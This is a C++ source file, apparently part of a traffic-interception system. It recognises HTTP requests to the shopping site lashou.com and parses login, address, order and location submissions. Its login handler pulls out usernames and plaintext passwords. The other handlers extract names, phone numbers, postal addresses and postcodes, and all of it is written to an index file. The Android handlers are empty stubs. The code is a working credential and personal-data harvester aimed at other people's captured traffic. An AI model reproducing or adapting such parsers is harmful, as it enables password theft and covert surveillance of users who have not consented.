#include "StdAfx.h"
#include "ShoppingLaShouWang.h"

shopping::LaShouWang::LaShouWang(HttpSession *http_session, const string &pro_name) : Shopping(http_session, pro_name)
{
	
}

shopping::LaShouWang::~LaShouWang()
{
	
}

int shopping::LaShouWang::IsLaShouWang(HttpSession *http_session)
{
	//pc登录信息
	if((http_session->m_Requestline.m_Host.Find("lashou.com")!=-1) &&  
		(http_session->m_Requestline.m_URI.Find("/account/login")!=-1))
	{
		return kPCWebLogin;
	}
	//pc新增地址
	if((http_session->m_Requestline.m_Host.Find("lashou.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/account/address/add/")!=-1))
	{
		return kPCWebAddAddress;
	}
	//pc修改地址
	if((http_session->m_Requestline.m_Host.Find("lashou.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/account/address/modify/")!=-1))
	{
		return kPCWebModifyAddress;
	}
	//pc提交订单
	if((http_session->m_Requestline.m_Host.Find("lashou.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/order/buy/submit/")!=-1))
	{
		return kPCWebNewOrder;
	}

	if((http_session->m_Requestline.m_Host.Find("lashou.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/ajax/address.php")!=-1))
	{
		return kPCWebLocation;
	}

	//android登录信息
	//android新增地址
	//android修改地址
	//android提交订单
	//android位置信息
	return 0;
}

int shopping::LaShouWang::Process(const char *packet,int action)
{
	//pc登录信息
	if (action == kPCWebLogin)
	{
		return PCWebLogin(packet);
	}	
	//pc新增地址
	if (action == kPCWebAddAddress)
	{
		return PCWebAddAddress(packet);
	}
	//pc修改地址
	if (action == kPCWebModifyAddress)
	{
		return PCWebModifyAddress(packet);
	}
	//pc提交订单
	if (action == kPCWebNewOrder)
	{
		return PCWebNewOrder(packet);
	}
	if (action==kPCWebLocation)
	{
		return PCWebLocation(packet);
	}
	//android登录信息
	//android新增地址
	//android修改地址
	//android提交订单
	//android位置信息
	return 0;
}

//pc登录信息
int shopping::LaShouWang::PCWebLogin(const char *packet)
{
	string src_data(packet);
	src_data=ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	string user,pass;
	user=ms_->GetValueBetweenBeginEnd(src_data,"username=","&");
	pass = ms_->GetValueFromMapByKey("password",true);
	
	if ( user.empty() || pass.empty())
	{
		return 0;
	}
	WriteVirtualIdentity(user,"上线");
	
	output_text_ = 
		"user=" + user + "\r\n" + 
		"pass=" + pass + "\r\n" + 
		"state=登录\r\n";	
	WriteIndexFile();
	return 1;
}

//pc新增地址
int shopping::LaShouWang::PCWebAddAddress(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);

	ms_->SplitStringToMap(src_data,'&','=');
	//获取地址
	string areacode,address;
	areacode=ms_->GetValueFromMapByKey("town",true);
	address=ms_->GetValueFromMapByKey("address",true);
	areacode=GetAddress(areacode);
	address_=areacode + address;
	//手机号
	phone_=ms_->GetValueFromMapByKey("mobile",true);
	//邮编
	string zipcode;
	zipcode = ms_->GetValueFromMapByKey("zipcode",true);
	//收件人
	name_ = ms_->GetValueFromMapByKey("username",true);
	
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	
	output_text_ = 
		"nick=" + name_ + "\r\n" + 
		"oid=" + phone_ + "\r\n" + 
		"msg=" + address_ + "\r\n" + 
		"msgtype=" + zipcode + "\r\n" + 
		"state=添加地址\r\n";
	
	WriteIndexFile();
	return 0;
}

//pc修改地址
int shopping::LaShouWang::PCWebModifyAddress(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	
	ms_->SplitStringToMap(src_data,'&','=');
	//用户名
	name_ = ms_->GetValueFromMapByKey("username",true);
	//地址
	string areacode,address;
	areacode = ms_->GetValueFromMapByKey("areacode",true);
	address = ms_->GetValueFromMapByKey("address",true);
	areacode = GetAddress(areacode);
	address_ = areacode + address;
	//邮编
	string zipcode;
	zipcode = ms_->GetValueFromMapByKey("zipcode",true);
	//手机号
	phone_ = ms_->GetValueFromMapByKey("mobile",true);
	
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	
	output_text_ = 
		"nick=" + name_ + "\r\n" + 
		"oid=" + phone_ + "\r\n" + 
		"msg=" + address_ + "\r\n" + 
		"msgtype=" + zipcode + "\r\n" +
		"state=修改地址\r\n";
	
	WriteIndexFile();
	return 0;
}

//pc提交订单
int shopping::LaShouWang::PCWebNewOrder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	//姓名
	name_ = ms_->GetValueFromMapByKey("sendUser",true);
	//地址
	address_ = ms_->GetValueFromMapByKey("street",true);
	//手机号
	phone_ = ms_->GetValueFromMapByKey("mobile",true);
	//邮编
	string postcode;
	postcode = ms_->GetValueFromMapByKey("code",true);
	if (name_.empty() || address_.empty() || phone_.empty() )
	{
		return 0;
	}

	output_text_ = 
		"nick=" + name_ + "\r\n" + 
		"oid=" + phone_ + "\r\n" + 
		"msg=" + address_ + "\r\n" + 
		"msgtype=" + postcode + "\r\n" +
		"state=提交订单\r\n";
	
	WriteIndexFile();
    return 1;
}
int shopping::LaShouWang::PCWebLocation(const char *packet)
{

	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	
	ms_->SplitStringToMap(src_data,'&','=');
	//用户名
	name_ = ms_->GetValueBetweenBeginEnd(src_data,"username","&");
	//地址
	string areacode,address;
	areacode = ms_->GetValueFromMapByKey("town",true);
	address = ms_->GetValueFromMapByKey("address",true);
	areacode = GetAddress(areacode);
	address_ = areacode + address;
	//邮编
	string zipcode;
	zipcode = ms_->GetValueFromMapByKey("code",true);
	//手机号
	phone_ = ms_->GetValueFromMapByKey("mobliephone",true);
	string mobile,heade,tel,tel1;
	heade = ms_->GetValueFromMapByKey("phone1",true);
	tel = ms_->GetValueFromMapByKey("phone2",true);
	tel1 = ms_->GetValueFromMapByKey("phone3",true);
	mobile =heade +"-"+tel +"|" +tel1;

	//id
	 string id = ms_->GetValueBetweenBeginEnd(src_data,"id=","&");
	
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	if (id.empty())
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"clientmsg=" + mobile + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"msgtype=" + zipcode + "\r\n" +
		"state=新增地址\r\n";
	}else
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"clientmsg=" + mobile + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"msgtype=" + zipcode + "\r\n" +
		"state=修改地址\r\n";
	}

	
	WriteIndexFile();
	return 0;
}
//android登录信息
int shopping::LaShouWang::AndroidLogin(const char *packet)
{
	return 1;
}
//android新增地址
int shopping::LaShouWang::AndroidAddAddress(const char *packet)
{
	return 1;
}
//android修改地址
int shopping::LaShouWang::AndroidModifyAddress(const char *packet)
{
	return 1;
}
//android提交订单
int shopping::LaShouWang::AndroidNewOrder(const char *packet)
{
	return 1;
}
//android位置信息
int shopping::LaShouWang::AndroidLocation(const char *packet)
{
	return 1;
}

